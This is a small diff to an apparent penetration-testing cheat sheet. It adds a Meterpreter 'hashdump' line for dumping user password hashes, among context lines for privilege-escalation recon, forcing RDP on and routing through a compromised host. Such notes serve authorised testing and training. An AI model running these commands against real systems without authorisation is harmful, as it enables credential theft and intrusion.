@@ -476,6 +476,7 @@ Output file contents:
 ## Meterpreter
 - list processes: `ps`
 - enumeration: `getuid` `sysinfo`
+- dump all user password hashes: `hashdump`
 - Post exploit recon for vulnerabilities: `run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true`
 - forcing RDP on a Windows machine: `run post/windows/manage/enable_rdp`
 - adding a route: `run autoroute -s 172.18.1.0 -n 255.255.255.0`
